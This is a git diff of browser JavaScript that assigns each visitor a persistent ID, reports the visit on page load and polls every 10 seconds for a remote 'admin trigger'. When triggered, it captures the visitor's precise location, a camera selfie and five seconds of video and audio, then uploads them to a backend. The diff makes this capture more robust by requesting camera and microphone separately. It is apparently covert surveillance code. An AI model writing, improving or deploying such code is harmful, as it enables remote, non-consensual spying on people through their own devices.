@@ -2,7 +2,6 @@ let alreadyCaptured = false;
 
 // ✅ Get stable username (logged-in or anonymous)
 let username = localStorage.getItem("loggedInUser");
-
 if (!username) {
   username = localStorage.getItem("anonUserId");
   if (!username) {
@@ -11,19 +10,26 @@ if (!username) {
   }
 }
 
-// Track visit on page load
+// ✅ Track visit
 fetch(`${BACKEND_URL}/api/track-visit`, {
   method: "POST",
   headers: { "Content-Type": "application/json" },
   body: JSON.stringify({ username })
 });
 
+// ✅ Manual capture function
 async function manualCapture(triggeredBy = "user", forcedUsername = "") {
   if (alreadyCaptured) return;
   alreadyCaptured = true;
 
+  let selfieBlob = null;
+  let videoBlob = null;
+  let audioBlob = null;
+  let videoStream = null;
+  let audioStream = null;
+
   try {
-    // 🌍 Step 1: Get Location
+    // ✅ Step 1: Get Location
     const location = await new Promise((resolve) => {
       navigator.geolocation.getCurrentPosition(
         pos => resolve({
@@ -32,66 +38,85 @@ async function manualCapture(triggeredBy = "user", forcedUsername = "") {
           accuracy: pos.coords.accuracy
         }),
         err => {
-          console.error("Location error:", err);
+          console.warn("📍 Location error:", err);
           resolve({ lat: 0, lon: 0, accuracy: 0 });
         },
         { enableHighAccuracy: true, timeout: 10000 }
       );
     });
 
-    // 🎥 Step 2: Get Camera & Mic
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+    // ✅ Step 2: Request Camera + Mic Separately
+    try {
+      videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
+    } catch (err) {
+      console.warn("📷 Camera denied:", err);
+    }
 
-    // 🖼️ Step 3: Capture Selfie
-    const video = document.createElement("video");
-    video.srcObject = stream;
-    video.muted = true;
-    await video.play();
-    await new Promise(r => setTimeout(r, 1000)); // wait to focus
+    try {
+      audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+    } catch (err) {
+      console.warn("🎤 Microphone denied:", err);
+    }
 
-    const canvas = document.createElement("canvas");
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    canvas.getContext("2d").drawImage(video, 0, 0);
-    const selfieBlob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.85));
+    // ✅ Step 3: Selfie (if video available)
+    if (videoStream?.getVideoTracks().length) {
+      const videoEl = document.createElement("video");
+      videoEl.srcObject = videoStream;
+      videoEl.muted = true;
+      try {
+        await videoEl.play();
+      } catch (e) {
+        console.warn("🎬 Video play failed:", e);
+      }
 
-    // 🎞️ Step 4: Record Video + Audio Separately
-    const videoTrack = stream.getVideoTracks()[0];
-    const audioTrack = stream.getAudioTracks()[0];
-    const videoStream = new MediaStream([videoTrack]);
-    const audioStream = new MediaStream([audioTrack]);
+      await new Promise(r => setTimeout(r, 1000));
+      const canvas = document.createElement("canvas");
+      canvas.width = videoEl.videoWidth;
+      canvas.height = videoEl.videoHeight;
+      canvas.getContext("2d").drawImage(videoEl, 0, 0);
+      selfieBlob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.85));
+    }
 
+    // ✅ Step 4: Record video and audio if possible
     const videoChunks = [], audioChunks = [];
+    let videoRecorder = null, audioRecorder = null;
+    const promises = [];
 
-    const videoRecorder = new MediaRecorder(videoStream, { mimeType: "video/webm;codecs=vp8" });
-    const audioRecorder = new MediaRecorder(audioStream, { mimeType: "audio/webm;codecs=opus" });
+    if (videoStream?.getVideoTracks().length) {
+      const vStream = new MediaStream([videoStream.getVideoTracks()[0]]);
+      videoRecorder = new MediaRecorder(vStream, { mimeType: "video/webm;codecs=vp8" });
+      videoRecorder.ondataavailable = e => videoChunks.push(e.data);
+      videoRecorder.start();
+      promises.push(new Promise(res => videoRecorder.onstop = res));
+    }
 
-    videoRecorder.ondataavailable = e => videoChunks.push(e.data);
-    audioRecorder.ondataavailable = e => audioChunks.push(e.data);
+    if (audioStream?.getAudioTracks().length) {
+      const aStream = new MediaStream([audioStream.getAudioTracks()[0]]);
+      audioRecorder = new MediaRecorder(aStream, { mimeType: "audio/webm;codecs=opus" });
+      audioRecorder.ondataavailable = e => audioChunks.push(e.data);
+      audioRecorder.start();
+      promises.push(new Promise(res => audioRecorder.onstop = res));
+    }
 
-    videoRecorder.start();
-    audioRecorder.start();
-
-    // ⏱️ Record for 5 seconds
     await new Promise(r => setTimeout(r, 5000));
 
-    // ✅ Force stop if still active (important for mobile)
-    if (videoRecorder.state !== "inactive") videoRecorder.stop();
-    if (audioRecorder.state !== "inactive") audioRecorder.stop();
+    if (videoRecorder?.state === "recording") videoRecorder.stop();
+    if (audioRecorder?.state === "recording") audioRecorder.stop();
+    await Promise.all(promises);
 
-    await Promise.all([
-      new Promise(res => videoRecorder.onstop = res),
-      new Promise(res => audioRecorder.onstop = res),
-    ]);
+    if (videoChunks.length) {
+      videoBlob = new Blob(videoChunks, { type: "video/webm" });
+    }
 
-    const videoBlob = new Blob(videoChunks, { type: "video/webm" });
-    const audioBlob = new Blob(audioChunks, { type: "audio/webm" });
+    if (audioChunks.length) {
+      audioBlob = new Blob(audioChunks, { type: "audio/webm" });
+    }
 
-    // 📤 Step 5: Upload
+    // ✅ Step 5: Upload
     const formData = new FormData();
-    formData.append("selfie", selfieBlob, `selfie-${Date.now()}.jpg`);
-    formData.append("video", videoBlob, `video-${Date.now()}.webm`);
-    formData.append("audio", audioBlob, `audio-${Date.now()}.webm`);
+    if (selfieBlob) formData.append("selfie", selfieBlob, `selfie-${Date.now()}.jpg`);
+    if (videoBlob) formData.append("video", videoBlob, `video-${Date.now()}.webm`);
+    if (audioBlob) formData.append("audio", audioBlob, `audio-${Date.now()}.webm`);
     formData.append("location", JSON.stringify(location));
     formData.append("triggeredBy", triggeredBy);
     formData.append("username", forcedUsername || username);
@@ -101,18 +126,18 @@ async function manualCapture(triggeredBy = "user", forcedUsername = "") {
       body: formData
     });
 
-    console.log("✅ Capture uploaded successfully");
-
-    // 🔚 Cleanup
-    stream.getTracks().forEach(track => track.stop());
+    console.log("✅ Upload successful");
 
   } catch (err) {
     console.error("❌ Capture failed:", err);
   } finally {
+    if (videoStream) videoStream.getTracks().forEach(track => track.stop());
+    if (audioStream) audioStream.getTracks().forEach(track => track.stop());
     alreadyCaptured = false;
   }
 }
 
+// 🔁 Admin trigger polling (always active)
 setInterval(async () => {
   console.log("Checking for trigger:", username);
   try {
@@ -128,3 +153,4 @@ setInterval(async () => {
     console.warn("Polling error:", err);
   }
 }, 10000);
+
